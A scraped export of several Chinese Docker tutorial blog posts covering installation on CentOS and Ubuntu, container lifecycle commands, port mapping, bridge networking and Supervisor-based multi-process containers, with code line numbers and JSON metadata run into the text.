1.2.1、镜像环境里相应软件的安装,通过脚本实现安装。在/root 下面的 install.sh 1.2.2、在镜像环境中,/root/install.sh 是安装镜像环境的脚本,您可以在 Centos6.5 64 位系统中自行采用此脚本安装,安装后的环境跟镜像里初始化的环境一致。值 得注意的是,如果采用此脚本安装镜像环境,需要 chmod 777 -R install.sh 赋予 777 安装权限。 1.2.3、在镜像环境中,/root 是安装环境的主目录,镜像中的环境是在此目录下安装 的。 2、软件目录及配置列表这里我yum安装的所以目录是默认的： 配置目录 : 123/etc/sysconfig/docker/etc/sysconfig/docker-storage /etc/sysconfig/docker-network 3、软件操作命令汇总12345这里的命令其实跟我们平常linux下面命令差不多：service docker status 查看docker现在运行的状态service docker start 启动dockerchkconfig docker on 设置开机自启动docker注意：正在将请求转发到“systemctl enable docker.service”。 4、关于卸载如何卸载镜像环境中安装的软件,可以参考如下命令完成卸载: yum remove docker-io 讲完现在基本的开始部署nginx. 1.镜像的列出: docker images 2.镜像搜索: 命令：docker search 这里可以搜索出nginx的镜像: 3.镜像获取从 dockerhub 上面获取 nginx 的镜像这里 这里已经获取到容器，默认的就已经安装好nginx。 4.启动容器 启动 nginx 容器，这里启动命令之前也有提到过：docker run 5.查看容器状态: docker ps 6.结束容器: docker kill 将 ps 列出的 container id 传入 docker kill 中即可: 这里有人说这里启动以后端口如何映射到本地端口。 7.容器端口映射 可以将容器的端口映射到主机上,比如 80-&gt; 80 端口,这样可以直接被外网访问到: docker run -itd -p 80:80 nginx 这里还有点需要注意：就是如果出现docker端口映射错误COMMAND_FAILED: ‘/sbin/iptables -t nat -A DOCKER -p tcp -d 0/0 –dport 8111 -j DNAT –to-destination 172.17.0.6:8111 ! -i docker0’ failed: iptables: No chain/target/match by that name. 解决方法： 1234567pkill docker 关闭dockeriptables -t nat -F 清除防火墙规则-如果没有写可以不用。ifconfig docker0 down docker 网卡关闭brctl delbr docker0重启docker后解决 8.此时访问服务器的 ip,即可看到 nginx 的页面。 具体配置就不多说了。上面也说清楚，就是你要跑什么服务，配置可以用脚本docker后台运行。 这里我写了几篇入门篇： Docker应用: docker应用 Docker安装篇: Docker安装篇","raw":null,"content":null,"categories":[{"name":"Docker","slug":"Docker","permalink":"http://blog.yangcvo.me/categories/Docker/"}],"tags":[{"name":"Virtualization-Docker","slug":"Virtualization-Docker","permalink":"http://blog.yangcvo.me/tags/Virtualization-Docker/"}]},{"title":"Docker学习(四)：网络功能Docker独立IP及容器互联","slug":"容器-虚拟化/Docker/Docker学习(四)：网络功能Docker独立IP及容器互联","date":"2016-07-13T09:27:04.000Z","updated":"2017-03-14T05:46:16.000Z","comments":true,"path":"2016/07/13/容器-虚拟化/Docker/Docker学习(四)：网络功能Docker独立IP及容器互联/","link":"","permalink":"http://blog.yangcvo.me/2016/07/13/容器-虚拟化/Docker/Docker学习(四)：网络功能Docker独立IP及容器互联/","excerpt":"","text":"Docker 独立IP及容器互联内置bridge (nat) 缺点： 需要配置服务注册/发现，否则宿主机端口分配困难，容易冲突。 由于每个容器暴露的端口都不一致，造成前端路由层nginx配置（proxy_pass）里面无法使用dns方式。 端口映射要在容器启动时指定好，后期无法变更。 测试发现nat不支持websocket. 自建桥接网络 优点： 每个容器都有自己的独立IP，对外提供服务，如：nginx+php ，nginx-resin ，都可以使用默认的80端口。 由于容器保罗端口都可以使用80端口，因此前端路由层nginx配置（proxy_pass）里可以使用dns方式。 无需为后期端口映射添加而烦恼 配置bridge桥接网络：这里操作系统centos 7.1： 这里我的宿主机：IP：192.168.1.183 12345678第一步：先关闭dockerservice docker stop第二步：关闭docker0 ifconfig docker0 down 第三步：删除docker0brct1 delbr docker0 删除以后需要到这个目录下面创建网卡。 在/etc/sysconfig/network-scripts下，修改ifcfg-eth0网卡配置，同时增加ifcfg-br0桥接网卡配置如下： 12345678910111213141516171819202122[root@docker1 ~]# cd /etc/sysconfig/network-scripts/[root@docker1 network-scripts]# cp ifcfg-eth0 ifcfg-br0[root@docker1 network-scripts]# vim ifcfg-br0 TYPE=BridgeDEVICE=br0NM_CONTROLLED=noBOOTPROTO=staticONBOOT=yesIPADDR=192.168.1.183NETMASK=255.255.255.0GATEWAY=192.168.1.1[root@docker1 network-scripts]# vim ifcfg-eth0TYPE=EthernetBOOTPROTO=staticDEVICE=eth0ONBOOT=yesBRIDGE=\"br0\"BOOTPROTO=none 重启network 1[root@docker1 network-scripts]# /etc/init.d/network restart docker0没有了。只看到br0 用的最多的是映射端口。docker映射到虚拟机上面外网端口。 1.查看启动容器状态: docker ps -l 123[root@docker ~]# docker ps -l CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES c05467856f8f docker.io/jdeathe/centos-ssh \"/bin/bash\" 5 weeks ago Up 5 weeks 22/tcp sleepy_brattain 2.查看启动容器需要映射端口必须先结束容器: docker kill 将 ps 列出的 container id 传入 docker kill 中即可: 12[root@docker ~]# docker kill c05467856f8fc05467856f8f 3.容器端口映射 可以将tomcat容器的端口映射到主机上,比如 8080-&gt; 80 端口,这样可以直接被外网访问到: 12[root@docker ~]# docker run -itd -p 8080:10001 docker.io/ jdeathe/centos-ssh 87606f687a3fdc0e9dfe4f7a5a7ebc64961bd0d70d263d5462c1b9060c882725 在查看运行状态： 123[root@docker ~]# docker ps -l CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 87606f687a3f docker.io/jdeathe/centos-ssh \"/usr/bin/supervisord\" 16 seconds ago Up 15 seconds 22/tcp, 0.0.0.0:8080-&gt;10001/tcp elated_meitner 这里还有点需要注意：就是如果出现docker端口映射错误COMMAND_FAILED: ‘/sbin/iptables -t nat -A DOCKER -p tcp -d 0/0 –dport 8111 -j DNAT –to-destination 172.17.0.6:8111 ! -i docker0’ failed: iptables: No chain/target/match by that name. 解决方法： 1234567pkill docker 关闭dockeriptables -t nat -F 清除防火墙规则-如果没有写可以不用。ifconfig docker0 down docker 网卡关闭brctl delbr docker0重启docker后解决 报错二：线上端口被占用 123[root@docker ~]# docker run -itd -p 10001:8080 tomcat-account/centos /bin/bash60a67031b61c2b4b4e6573e479c53d260e70bf4b461d2c7a35031d736db05025docker: Error response from daemon: failed to create endpoint condescending_kare on network bridge: Error starting userland proxy: listen tcp 0.0.0.0:8080: bind: address already in use. 需要kill当前的8080 重新定义 12345[root@docker ~]# docker run -itd -p 10001:8080 tomcat-account/centos /bin/bash411db35cd3c7af171a822257888a657abdfff277a0302435521df4bdd618867f[root@docker ~]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES411db35cd3c7 tomcat-account/centos \"/bin/bash\" 9 seconds ago Up 8 seconds 0.0.0.0:8080-&gt;10001/tcp small_wescoff","raw":null,"content":null,"categories":[{"name":"Docker","slug":"Docker","permalink":"http://blog.yangcvo.me/categories/Docker/"}],"tags":[{"name":"Virtualization-Docker","slug":"Virtualization-Docker","permalink":"http://blog.yangcvo.me/tags/Virtualization-Docker/"}]},{"title":"Docker学习(五)：容器内多进程管理","slug":"容器-虚拟化/Docker/Docker学习(五)：容器内多进程管理","date":"2016-07-13T04:41:03.000Z","updated":"2017-03-14T05:46:41.000Z","comments":true,"path":"2016/07/13/容器-虚拟化/Docker/Docker学习(五)：容器内多进程管理/","link":"","permalink":"http://blog.yangcvo.me/2016/07/13/容器-虚拟化/Docker/Docker学习(五)：容器内多进程管理/","excerpt":"","text":"目录1、Supervisor介绍及原理2、Supervisor配置与实例3、参考文档 从Docker的设计初衷来看，它并不推崇在一个容器中运行多个进程，但在一些实际的场景，比如小规模应用、老业务容器化等，都可能需要在一个容器中，同时运行多个程序。 在非容器的环境下，同时运行多个进程是非常简单的，系统初始化的时候，都会启动一个init进程，其余的进程都由它来管理。但在容器环境下就不一样了，因为它并没有init进程，所以大多数情况下，我们启动一个Docker容器，只让它运行一个前台程序，并且保证它不会退出，当容器检查到内部没有运行的前台进程之后，自己就会自动退出。 换句话说启动Docker容器时不能运行后台程序，诸如在CentOS里面，service xxx start，这种后台启动进程的方式都不可用，因为没init进程。 那么有办法解决这个问题吗？ 目前主要有两个工具，一个是Supervisor，另一个是Monit。本篇先来介绍Supervisor，Monit会在之后的文章中再做详解。 一、Supervisor介绍及原理 Supervisor是一个进程管理工具，是客户端/服务端结构，通过它可以监控和控制其他的进程，同时它自身提供了一个WebUI，对其管理的应用进程，可以在WebUI进行start,stop,restart操作。由Supervisor管理的进程，都是它的子进程。 在Linux系统启动之后，第一个启动的用户态进程是/sbin/init ，它的PID是1，其余用户态的进程都是init进程的子进程。Supervisor在Docker容器里面充当的就类似init进程的角色，其它的应用进程都是Supervisor进程的子进程。通过这种方法就可以实现在一个容器中启动运行多个应用。 ~Docker中的Supervisor 编辑Dockerfile 12345678910vim DockerfileFROM ubuntu:14.04MAINTAINER debugo@sina.comRUN apt-get updateRUN apt-get install -y openssh-server supervisorRUN mkdir -p /var/run/sshdRUN mkdir -p /var/log/supervisorCOPY supervisord.conf /etc/supervisor/supervisord.confEXPOSE 22 80CMD [\"/usr/bin/supervisord\"] 其中，在当前目录新建一个supervisord.conf,由于是CMD执行，supervisord不用以daemon的形式启动。 123456[supervisord]nodaemon=true[program:sshd]command=/usr/sbin/sshd -Dautorestart=unexpectedautostart=true 下面构建这个image 12docker build -t supervisor-test .Successfully built a97936f2da4a 运行测试： 12345678docker run -it supervisor-test2015-01-04 06:41:12,010 CRIT Supervisor running as root (no user in config file)2015-01-04 06:41:12,016 INFO supervisord started with pid 12015-01-04 06:41:13,019 INFO spawned: 'sshd' with pid 82015-01-04 06:41:14,021 INFO success: sshd entered RUNNING state, process has stayed up for &gt; than 1 seconds (startsecs)2015-01-04 06:41:55,268 WARN received SIGINT indicating exit request2015-01-04 06:41:55,269 INFO waiting for sshd to die2015-01-04 06:41:55,270 INFO stopped: sshd (exit status 0)","raw":null,"content":null,"categories":[{"name":"Docker","slug":"Docker","permalink":"http://blog.yangcvo.me/categories/Docker/"}],"tags":[{"name":"Virtualization-Docker","slug":"Virtualization-Docker","permalink":"http://blog.yangcvo.me/tags/Virtualization-Docker/"}]},{"title":"Docker学习(三)：容器应用","slug":"容器-虚拟化/Docker/Docker学习(三)：容器应用","date":"2016-07-12T10:21:45.000Z","updated":"2017-03-14T05:46:12.000Z","comments":true,"path":"2016/07/12/容器-虚拟化/Docker/Docker学习(三)：容器应用/","link":"","permalink":"http://blog.yangcvo.me/2016/07/12/容器-虚拟化/Docker/Docker学习(三)：容器应用/","excerpt":"","text":"启动容器启动容器有两种方式，一种是基于镜像新建一个容器并启动，另外一个是将在终止状态（stopped）的容器重新启动。 因为 Docker 的容器实在太轻量级了，很多时候用户都是随时删除和新创建容器。 docker 客户端非常简单 。Docker 的每一项操作都是通过命令行来实现的，而每一条命令行都可以使用一系列的标识（flags）和参数。 123# Usage: [sudo] docker [flags] [command] [arguments] ..# Example:$ docker run -i -t centos /bin/bash 这个命令不仅返回了您使用的 Docker 客户端和进程的版本信息，还返回了 GO 语言的版本信息( Docker的编程语言 )。 一个交互式的容器所需要的命令主要为 docker run 。 例如，下面的命令输出一个 “Hello World”，之后终止容器。 12[root@docker ~]# docker run -i -t docker.io/centos /bin/echo 'Hello world' Hello world 这跟在本地直接执行/bin/echo &#39;hello world&#39;几乎感觉不出任何区别。 让我们尝试再次运行 docker run，这次我们指定一个新的命令来运行我们的容器。 1234$ sudo docker run -t -i centos /bin/bash[root@docker opt]# sudo docker run -t -i centos /bin/bash[root@04a1e7967683 /]# 我们继续指定了 docker run 命令，并启动了 centos 镜像。但是我们添加了两个新的标识(参数flags)： -t 和 -i 。-t表示在新容器内指定一个伪终端或终端，-i表示允许我们对容器内的 (STDIN) 进行交互。 我们在容器内还指定了一个新的命令： /bin/bash 。这将在容器内启动 bash shell 所以当容器（container）启动之后，我们会获取到一个命令提示符： root@04a1e7967683 /]# 我们尝试在容器内运行一些命令： 1234[root@04a1e7967683 /]# pwd/[root@04a1e7967683 /]# lsanaconda-post.log bin dev etc home lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr var 你可以看到我们运行 pwd 来显示当前目录，这时候显示的是我们的根目录。我们还列出了根目录的文件列表，通过目录列表我们看出来这是一个典型的 Linux 文件系统。 你可以在容器内随便的玩耍，你可以使用 exit 命令或者使用 CTRL-D 来退出容器。 与我们之前的容器一样，一旦你的 Bash shell 退出之后，你的容器就停止了。 当利用 docker run 来创建容器时，Docker 在后台运行的标准操作包括： 检查本地是否存在指定的镜像，不存在就从公有仓库下载 利用镜像创建并启动一个容器 分配一个文件系统，并在只读的镜像层外面挂载一层可读写层 从宿主主机配置的网桥接口中桥接一个虚拟接口到容器中去 从地址池配置一个 ip 地址给容器 执行用户指定的应用程序 执行完毕后容器被终止 启动已终止容器可以利用 docker start 命令，直接将一个已经终止的容器启动运行。容器的核心为所执行的应用程序，所需要的资源都是应用程序运行所必需的。除此之外，并没有其它的资源。可以在伪终端中利用 ps 或 top 来查看进程信息。 1234[root@149f2055cb10 /]# ps PID TTY TIME CMD 1 ? 00:00:00 bash 15 ? 00:00:00 ps 可见，容器中仅运行了指定的 bash 应用。这种特点使得 Docker 对资源的利用率极高，是货真价实的轻量级虚拟化。 后台(background)运行更多的时候，需要让 Docker在后台运行而不是直接把执行命令的结果输出在当前宿主机下。此时，可以通过添加-d参数来实现。 下面举两个例子来说明一下。 如果不使用-d 参数运行容器。 123456789root@docker ~]# docker run -i -t docker.io/centos /bin/sh -c \"while true; do echo hello world; sleep 1 ; done\"hello worldhello worldhello worldhello worldhello worldhello worldhello worldhello world 容器会把输出的结果(STDOUT)打印到宿主机上面这里我是用脚本让他一直输出出来，那么如果使用了 -d参数去运行容器。这里我也举了个例子。 12[root@docker ~]# docker run -d -i -t docker.io/centos /bin/sh -c \"while true; do echo hello world; sleep 1 ; done\"2581176d1d864860b754293f9c4606698d5fcb290bb1de2800afd5a8cf441f2e 此时容器会在后台运行并不会把输出的结果(STDOUT)打印到宿主机上面(输出结果可以用docker logs 查看)。 注： 容器是否会长久运行，是和docker run指定的命令有关，和 -d 参数无关。使用-d 参数启动后会返回一个唯一的 id，也可以通过 docker ps命令来查看容器信息 123[root@docker ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES2581176d1d86 docker.io/centos \"/bin/sh -c 'while tr\" 2 minutes ago Up 2 minutes fervent_wescoff 要获取容器的输出信息，可以通过 docker logs 命令。 1234567891011[root@docker ~]# docker logs [container ID or NAMES]hello worldhello worldhello world.....[root@docker ~]# docker logs 2581176d1d86hello worldhello worldhello world..... 终止容器现在我们已经可以创建我们自己的容器了，让我们处理正在运行的进程容器并停止它。我们使用 docker stop 命令来停止容器 。 12$ sudo docker stop sad_shawsad_shaw 此外，当Docker容器中指定的应用终结时，容器也自动终止。 例如对于上一章节中只启动了一个终端的容器，用户通过 exit 命令或 Ctrl+d 来退出终端时，所创建的容器立刻终止。 终止状态的容器可以用 docker ps -a 命令看到。例如: 12345678910[root@docker ~]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES2581176d1d86 docker.io/centos \"/bin/sh -c 'while tr\" 8 minutes ago Up 8 minutes fervent_wescoff6decd2bc924e docker.io/centos \"/bin/sh -c 'while tr\" 19 minutes ago Up 19 minutes pensive_jepsen6b747a38d1ab docker.io/centos \"/bin/sh -c 'while tr\" 21 minutes ago Up 21 minutes jovial_swirles149f2055cb10 docker.io/centos \"/bin/bash\" 48 minutes ago Exited (0) 22 minutes ago focused_hawkingea9cb48d5aea docker.io/centos \"/bin/echo 'Hello wor\" 48 minutes ago Exited (0) 48 minutes ago condescending_feynmanc90d7129c34e docker.io/centos \"/bin/bash 'Hello wor\" 49 minutes ago Exited (127) 49 minutes ago pedantic_kirch8ac4d548112e docker.io/centos \"/bin/bash\" About an hour ago Exited (0) 49 minutes ago adoring_swartza258ef1ef83b centos \"/bin/bash\" About an hour ago Exited (127) About an hour ago determined_s 处于终止状态的容器，可以通过 docker start 命令来重新启动。 1234[root@docker ~]# docker stop 6b747a38d1ab6b747a38d1ab[root@docker ~]# docker stop 6decd2bc924e6decd2bc924e 此外， docker restart 命令会将一个运行态的容器终止，然后再重新启动它。 docker stop 命令会通知 Docker 停止正在运行的容器。如果它成功了，它将返回刚刚停止的容器名称。 让我们通过 docker ps 命令来检查它是否还工作。 进入容器在使用 -d参数时，容器启动后会进入后台。 某些时候需要进入容器进行操作，有很多种方法，包括使用 docker attach 命令或 nsenter 工具等。 attach 命令docker attach 是Docker自带的命令。下面示例如何使用该命令。 123456789[root@docker ~]# docker run -idt centosbc9fc22c17a3c41e51ebe30a10d9f1554d51f468651fae6b41764fc8f6435357[root@docker ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESbc9fc22c17a3 centos \"/bin/bash\" 10 seconds ago Up 9 seconds cranky_poitras2581176d1d86 docker.io/centos \"/bin/sh -c 'while tr\" 19 minutes ago Up 18 minutes fervent_wescoff28e833d4a45f centos \"/bin/bash\" 4 weeks ago Up 4 weeks sad_shaw[root@docker ~]# docker attach sad_shaw[root@28e833d4a45f /]# 但是使用 attach命令有时候并不方便。当多个窗口同时 attach到同一个容器的时候，所有窗口都会同步显示。当某个窗口因命令阻塞时,其他窗口也无法执行操作了。 导出和导入容器导出容器如果要导出本地某个容器，可以使用 docker export 命令。 123456789[root@docker ~]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES28e833d4a45f centos \"/bin/bash\" 4 weeks ago Up 2 seconds sad_shaw[root@docker ~]# docker export sad_shaw &gt; centos.tar[root@docker ~]# ll总用量 199584-rw-------. 1 root root 947 7月 12 13:54 anaconda-ks.cfg-rw-r--r--. 1 root root 204362240 8月 11 04:48 centos.tar-rw-r--r--. 1 root root 291 8月 10 04:18 syslog.sh 这样将导出容器快照到本地文件。 导入容器快照可以使用 docker import 从容器快照文件中再导入为镜像，例如： 1234567[root@docker ~]# cat centos.tar | docker import - test/centossha256:952fc37f4a2dc8604cbc3d624369fec8a6b0e2d9a09af294461944f34ddf7f04[root@docker ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEtest/centos latest 952fc37f4a2d 11 seconds ago 196.8 MBdocker.io/bitnami/apache latest 240bf1b03f01 4 weeks ago 283.1 MBdocker.io/centos latest 05188b417f30 5 weeks ago 196.8 MB 这里你可以看到REPOSITORY 下面test的镜像文件大小都一样的。 此外，也可以通过指定 URL 或者某个目录来导入，例如 12$sudo docker import http://example.com/exampleimage.tgz example/imagerepo 注：用户既可以使用 docker load 来导入镜像存储文件到本地镜像库，也可以使用 docker import 来导入一个容器快照到本地镜像库。这两者的区别在于容器快照文件将丢弃所有的历史记录和元数据信息（即仅保存容器当时的快照状态），而镜像存储文件将保存完整记录，体积也要大。此外，从容器快照文件导入时可以重新指定标签等元数据信息。 删除容器可以使用 docker rm 来删除一个处于终止状态的容器。 例如: 12[root@docker ~]# docker rm naughty_boydnaughty_boyd 如果要删除一个运行中的容器，可以添加 -f参数。Docker 会发送 SIGKILL信号给容器。 1234567root@docker ~]# docker ps -lCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES6b747a38d1ab docker.io/centos \"/bin/sh -c 'while tr\" 36 hours ago Exited (137) 36 hours ago jovial_swirles[root@docker ~]# dockerdocker docker-current docker-storage-setup[root@docker ~]# docker rm -f 6b747a38d1ab6b747a38d1ab 清理所有处于终止状态的容器用 docker ps -a 命令可以查看所有已经创建的包括终止状态的容器，如果数量太多要一个个删除可能会很麻烦，用 docker rm $(docker ps -a -q)可以全部清理掉。例子： 1234567891011[root@docker ~]# docker rm $(docker ps -a -q)149f2055cb10ea9cb48d5aeac90d7129c34e8ac4d548112ea258ef1ef83b10942e7856abe30fe573c06c712498a4a63304a1e796768328e833d4a45f 注意：这个命令其实会试图删除所有的包括还在运行中的容器，不过就像上面提过的 docker rm 默认并不会删除运行中的容器。 新手经常会有疑问的是关于Docker打包的粒度，比如MySQL要不要放在镜像中？最佳实践是根据应用的规模和可预见的扩展性来确定Docker打包的粒度。例如某小型项目管理系统使用LAMP环境，由于团队规模和使用人数并不会有太大的变化（可预计的团队规模范围是几人到几千人），数据库也不会承受无法承载的记录数（生命周期内可能一个表最多会有数十万条记录），并且客户最关心的是快速部署使用。那么这时候把MySQL作为依赖放在镜像里是一种不错的选择。当然如果你在为一个互联网产品打包，那最好就是把MySQL独立出来，因为MySQL很可能会单独做优化做集群等。 使用公有云构建发布运行Docker也是个不错的选择。DaoCloud提供了从构建到发布到运行的全生命周期服务。特别适合像微擎这种微信公众平台、或者中小型企业CRM系统。上线周期更短，比使用IAAS、PAAS的云服务更具有优势。 小结 有关Dockerfile的进阶阅读： http://www.docker.io/learn/dockerfile/level2/http://www.docker.io/learn/dockerfile/level2/ 学习总结：在这个过程中，我们学习到了几个 Docker 命令： 1234567891011121314151617181920212223docker ps 列出容器docker logs 容器id 显示容器的标准输出docker start 容器id 停止正在运行的容器docker stop 容器id 停止正在运行的容器docker restart 容器终止然后重新启动它。docker ps -a 查看所有在运行和没有运行的镜像容器docker run -i -t 启动运行容器。docker run -i -t -d 让容器后台运行程序。 -d 表示在后台启动。docker attach sad_shaw 进入到指定容器。**非常方便**docker export sad_shaw &gt; /root/centos.tar 镜像导出到服务器指定目录。没有指定绝对目录默认当前目录。docker export sad_shaw &gt; centos.tar sad_shaw 镜像到处-到处为centos.tarcat centos.tar | docker import - test/centos 这里是把centos.tar导入到新的镜像命名为/test/centosdocker rm sad_shaw 删除容器sad_shawdocker rm -f sad_shaw 删除运行中的容器sad_shawdocker rm $(docker ps -a -q) 清理所有处于停止的容器docker rmi &lt;image id&gt; 删除images，通过image的id来指定删除谁docker rmi $(docker images -q) 删除全部imagedocker rmi $(docker images | grep \"^&lt;none&gt;\" | awk \"&#123;print $3&#125;\")想要删除untagged images，也就是那些id为&lt;None&gt;的image的话可以用 docker run -d -p 8080:8080 -p 222:22 容器名称 /bin/bash 解析： -p指定容器启动后docker上运行端口映射及容器里运行的端口，8080：8080 第一个8080表示docker系统上8080, 第二个8080表示docker虚拟机里面的端口，用户访问本机8080端口自动映射到容器里面的8080","raw":null,"content":null,"categories":[{"name":"Docker","slug":"Docker","permalink":"http://blog.yangcvo.me/categories/Docker/"}],"tags":[{"name":"Virtualization-Docker","slug":"Virtualization-Docker","permalink":"http://blog.yangcvo.me/tags/Virtualization-Docker/"}]},{"title":"Docker学习(二)：安装篇","slug":"容器-虚拟化/Docker/Docker学习(二)：安装篇","date":"2016-07-12T08:44:53.000Z","updated":"2017-03-14T05:46:01.000Z","comments":true,"path":"2016/07/12/容器-虚拟化/Docker/Docker学习(二)：安装篇/","link":"","permalink":"http://blog.yangcvo.me/2016/07/12/容器-虚拟化/Docker/Docker学习(二)：安装篇/","excerpt":"","text":"CentOS 系列安装Docker以下版本的CentOS 支持 Docker ： CentOS 7 (64-bit)CentOS 6.5 (64-bit) or later该指南可能会适用于其它的 EL6/EL7 的 Linux 发行版，譬如 Scientific Linux 。但是我们没有做过任何测试。 请注意，由于 Docker 的局限性，Docker 只能运行在64位的系统中。 这些操作系统下可以直接通过命令安装Docker，老一些操作系统Docker官方也提供了安装方案。下面的实验基于CentOS 7进行。关于其他版本操作系统上Docker的安装，请参考官方文档 内核支持目前的CentOS项目，仅发行版本中的内核支持Docker。如果你打算在非发行版本的内核上运行 Docker，内核的改动可能会导致出错。 Docker 运行在 CentOS-6.5 或更高的版本的 CentOS 上，需要内核版本是 2.6.32-431 或者更高版本 ，因为这是允许它运行的指定内核补丁版本。 安装 Docker - CentOS-6.5在 CentOS-6.5 中，Docker 包含在 Extra Packages for Enterprise Linux (EPEL) 提供的镜像源中，该组织致力于为 RHEL 发行版创建和维护更多可用的软件包。 首先，你需要安装 EPEL 镜像源，请查看 EPEL installation instructions. 在 CentOS-6 中，一个系统自带的可执行的应用程序与 docker 包名字发生冲突，所以我们重新命名 docker 的RPM包名字为 docker-io 。 CentOS-6 中 安装 docker-io 之前需要先卸载 docker 包。 1$ sudo yum -y remove docker 下一步，安装 docker-io 包来为我们的主机安装Docker。 1$ sudo yum install docker-io 安装 - CentOS-7Docker 软件包已经包含在默认的 CentOS-Extras 软件源里，安装命令如下： 使用yum从软件仓库安装Docker： 1sudo yum install docker FirewallDCentOS-7中介绍了firewalld，firewall的底层是使用iptables进行数据过滤，建立在iptables之上，这可能会与Docker产生冲突。 当firewalld 启动或者重启的时候，将会从 iptables 中移除 DOCKER 的规则，从而影响了 Docker 的正常工作。 当你使用的是 Systemd 的时候， firewalld 会在 Docker 之前启动，但是如果你在 Docker 启动之后再启动 或者重启 firewalld ，你就需要重启 Docker 进程了。 手动安装最新版本的 Docker当你使用推荐方法来安装 Docker 的时候，上述的 Docker 包可能不是最新发行版本。 如果你想安装最新版本，你可以直接安装二进制包 当你使用二进制安装时，你可能想将 Docker 集成到 Systemd 的系统服务中。为了实现至一点，你需要从github中下载 service and socket两个文件，然后安装到 /etc/systemd/system 中。 首先启动Docker的守护进程： sudo service docker start 如果想要Docker在系统启动时运行，执行： chkconfig docker on Docker在CentOS上好像和防火墙有冲突，应用防火墙规则后可能导致Docker无法联网，重启Docker可以解决。这里不重启的话，会提示无法连接： 123456root@docker opt]# docker pull centosUsing default tag: latestTrying to pull repository docker.io/library/centos ...Pulling repository docker.io/library/centosTag latest not found in repository docker.io/library/centosTag latest not found in repository docker.io/library/centos Ubuntu 系列安装 Docker系统要求 Docker 支持以下版本的Ubuntu操作系统： Ubuntu Xenial 16.04 (LTS) Ubuntu Wily 15.10 Ubuntu Trusty 14.04 (LTS) Ubuntu Precise 12.04 (LTS) 预安装Docker 目前只能安装在 64 位平台上，并且要求内核版本不低于 3.10，实际上内核越新越好，过低的内核版本容易造成功能的不稳定。 用户可以通过如下命令检查自己的内核版本详细信。 123$ uname -aLinux Host 3.16.0-43-generic #58~14.04.1-Ubuntu SMP Mon Jun 22 10:21:20 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux 或者 1234$ cat /proc/versionLinux version 3.16.0-43-generic (buildd@brownie) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #58~14.04.1-Ubuntu SMP Mon Jun 2210:21:20 UTC 2015 Docker 目前支持的最低 Ubuntu 版本为 12.04 LTS，但实际上从稳定性上考虑，推荐至少使用 14.04 LTS 版本。 更新APT镜像源首先需要安装 apt-transport-https 包支持 https 协议的源。 1$ sudo apt-get install apt-transport-https ca-certificates 添加源的 gpg 密钥。 12$ sudo apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D 获取当前操作系统的代号。 12$ lsb_release -cCodename: trusty 一般的，12.04 (LTS) 代号为 precise，14.04 (LTS) 代号为 trusty，15.04 代号为vivid，15.10 代号为 wily，16.04 代号为Xenial 。这里获取到代号为 trusty。接下来就可以添加 Docker 的官方 apt 软件源了。通过下面命令创建/etc/apt/sources.list.d/docker.list 文件，并写入源的地址内容。非trusty 版本的系统注意修改为自己对应的代号。 123$ sudo cat &lt;&lt;EOF &gt; /etc/apt/sources.list.d/docker.listdeb https://apt.dockerproject.org/repo ubuntu-trusty mainEOF 添加成功后，更新 apt 软件包缓存。 1$ sudo apt-get update 分版本的预安装任务高于 12.04 LTS的版本 123Ubuntu Xenial 16.04 (LTS)Ubuntu Wily 15.10Ubuntu Trusty 14.04 (LTS) 为了让 Docker 使用 aufs 存储，推荐安装 linux-image-extra 软件包。 1$ sudo apt-get install -y linux-image-extra-$(uname -r) 在 Ubuntu 14.04 或者 12.04上安装Docker，需要安装 apparmor （apparmor是Linux内核的一个安全模块，新版本的Ubuntu已经被整合到内核）: 1$ sudo apt-get install apparmor 12.04 LTS版本如果使用 12.04 LTS 版本，首先要更新系统内核和安装可能需要的软件包，包括 linux-image-generic-lts-trusty （必备） linux-headers-generic-lts-trusty （必备） xserver-xorg-lts-trusty （带图形界面时必备） libgl1-mesa-glx-lts-trusty（带图形界面时必备）安装命令(根据环境和要求不同，选择安装上述软件包)，如： 1$ sudo apt-get install linux-image-generic-lts-trusty 当然，12.04 LTS 还要根据需要安装 linux-image-extra 和 apparmor 软件包。注：Ubuntu 发行版中，LTS （Long-Term-Support）意味着更稳定的功能和更长期（目前为 5 年）的升级支持，生产环境中尽量使用 LTS 版本。 安装 Docker在成功添加源之后，就可以安装最新版本的 Docker 了，软件包名称为 dockerengine。 1$ sudo apt-get install -y docker-engine 如果系统中存在旧版本的 Docker （lxc-docker），会提示是否先删除，选择是即可。 其他可选配置参见 docker官方配置文档 基本信息查看这里我是用centos 7.1 安装做学习的 docker version：查看docker的版本号，包括客户端、服务端、依赖的Go等 12345678910111213141516171819202122232425262728293031323334353637383940414243[root@docker opt]# docker versionClient: Version: 1.10.3 API version: 1.22 Package version: docker-common-1.10.3-44.el7.centos.x86_64 Go version: go1.4.2 Git commit: 9419b24-unsupported Built: Fri Jun 24 12:09:49 2016 OS/Arch: linux/amd64Server: Version: 1.10.3 API version: 1.22 Package version: docker-common-1.10.3-44.el7.centos.x86_64 Go version: go1.4.2 Git commit: 9419b24-unsupported Built: Fri Jun 24 12:09:49 2016 OS/Arch: linux/amd64 ``` ### Docker 帮助说明``` bash[root@docker opt]# docker -helpUsage: docker [OPTIONS] COMMAND [arg...] docker daemon [ --help | ... ] docker [ --help | -v | --version ]A self-sufficient runtime for containers.Options: --config=~/.docker Location of client config files -D, --debug Enable debug mode -H, --host=[] Daemon socket(s) to connect to -h, --help Print usage -l, --log-level=info Set the logging level --tls Use TLS; implied by --tlsverify --tlscacert=~/.docker/ca.pem Trust certs signed only by this CA --tlscert=~/.docker/cert.pem Path to TLS certificate file --tlskey=~/.docker/key.pem Path to TLS key file --tlsverify Use TLS and verify the remote -v, --version Print version information and quit 